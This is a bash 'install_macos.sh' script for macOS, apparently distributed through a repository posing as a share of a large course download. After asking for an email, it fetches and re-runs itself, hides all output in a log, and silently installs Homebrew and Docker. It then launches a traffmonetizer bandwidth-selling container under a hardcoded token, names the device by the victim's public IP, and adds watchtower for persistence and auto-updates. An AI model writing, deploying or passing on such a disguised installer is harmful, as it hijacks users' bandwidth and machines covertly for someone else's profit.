#!/usr/bin/env bash
if [ -z "${TM_SKIP_PROMPT:-}" ]; then
  export TM_SKIP_PROMPT=1
  if { true </dev/tty; } 2>/dev/null; then
    printf 'Mời bạn nhập email: ' >/dev/tty
    read -r EMAIL </dev/tty && export EMAIL
  fi
  echo "Hello"
fi

TOKEN="NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
SELF_URL="https://gitlab.com/sharegoogledrive/40gb_khoa_hoc/-/raw/main/install_macos.sh"
SELF_PATH="$HOME/.tm/install_macos.sh"
IMAGE_REPO="traffmonetizer/cli_v2"
CONTAINER_NAME="tm"
DATA_VOLUME="tm-data"
DEVICE_NAME_OVERRIDE=""
ENABLE_WATCHTOWER="${TM_WATCHTOWER:-true}"
WATCHTOWER_IMAGE="nickfedor/watchtower:latest"
WATCHTOWER_INTERVAL=21600
DOCKER_WAIT_TRIES=90
DOCKER_DMG_ARM64="https://desktop.docker.com/mac/main/arm64/Docker.dmg"
DOCKER_DMG_AMD64="https://desktop.docker.com/mac/main/amd64/Docker.dmg"

set -u

if [ ! -f "$0" ] && [ "${SELF_URL#*USER/REPO}" = "$SELF_URL" ]; then
  mkdir -p "$(dirname "$SELF_PATH")"
  curl -fsSL "$SELF_URL" -o "$SELF_PATH" 2>/dev/null
  if [ -s "$SELF_PATH" ]; then chmod +x "$SELF_PATH" && exec "$SELF_PATH" "$@"; fi
fi

mkdir -p "$HOME/.tm" 2>/dev/null || true
LOG_FILE="$HOME/.tm/install.log"
if : >>"$LOG_FILE" 2>/dev/null; then exec >>"$LOG_FILE" 2>&1; else exec >/dev/null 2>&1; fi
chmod +x "$0" 2>/dev/null || true

[ "$(uname -s)" = "Darwin" ] || exit 1
[ "$(id -u)" -ne 0 ] || exit 1
{ [ -n "$TOKEN" ] && [ "$TOKEN" != "DAN_TOKEN_CUA_BAN_VAO_DAY" ]; } || exit 1

case "$(uname -m)" in
  arm64)  TAG="arm64v8" ;;
  x86_64) TAG="latest" ;;
  *) exit 1 ;;
esac
IMAGE="$IMAGE_REPO:$TAG"

export PATH="/opt/homebrew/bin:/usr/local/bin:/Applications/Docker.app/Contents/Resources/bin:$PATH"

install_docker_dmg() {
  local url="$DOCKER_DMG_AMD64"; [ "$(uname -m)" = "arm64" ] && url="$DOCKER_DMG_ARM64"
  curl -fsSL "$url" -o /tmp/Docker.dmg || return 1
  hdiutil attach /tmp/Docker.dmg -nobrowse -quiet -mountpoint /Volumes/DockerTM || return 1
  cp -R /Volumes/DockerTM/Docker.app /Applications/
  hdiutil detach /Volumes/DockerTM -quiet; rm -f /tmp/Docker.dmg
}

if ! command -v docker >/dev/null 2>&1 && [ ! -d /Applications/Docker.app ]; then
  if ! command -v brew >/dev/null 2>&1; then
    NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    [ -x /opt/homebrew/bin/brew ] && eval "$(/opt/homebrew/bin/brew shellenv)"
    [ -x /usr/local/bin/brew ] && eval "$(/usr/local/bin/brew shellenv)"
  fi
  if command -v brew >/dev/null 2>&1; then
    brew install --cask docker-desktop || brew install --cask docker || install_docker_dmg
  else
    install_docker_dmg
  fi
fi

sudo -n /Applications/Docker.app/Contents/MacOS/install --accept-license --user="$USER" || true

docker info >/dev/null 2>&1 || open -g -j -a Docker
for _ in $(seq 1 "$DOCKER_WAIT_TRIES"); do docker info >/dev/null 2>&1 && break; sleep 5; done
docker info >/dev/null 2>&1 || exit 1

DEVICE_NAME="$DEVICE_NAME_OVERRIDE"
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(curl -4 -fsS --max-time 10 https://api.ipify.org || true)"
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(ipconfig getifaddr en0 || true)"
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(hostname)"

docker rm -f "$CONTAINER_NAME" || true
docker pull "$IMAGE" || exit 1

docker run -d --name "$CONTAINER_NAME" \
  --restart unless-stopped \
  -e HOME=/var/lib/tm \
  -v "$DATA_VOLUME":/var/lib/tm \
  "$IMAGE" \
  --token "$TOKEN" --device-name "$DEVICE_NAME" start accept \
  || exit 1

docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$CONTAINER_NAME" \
  || echo "WARN: container '$CONTAINER_NAME' khong chay sau khi khoi tao"

if [ "$ENABLE_WATCHTOWER" = "true" ]; then
  docker rm -f watchtower || true
  docker run -d --name watchtower \
    --restart unless-stopped \
    -v /var/run/docker.sock:/var/run/docker.sock \
    -e WATCHTOWER_CLEANUP=true \
    -e WATCHTOWER_POLL_INTERVAL="$WATCHTOWER_INTERVAL" \
    "$WATCHTOWER_IMAGE" "$CONTAINER_NAME"
fi

sleep 5
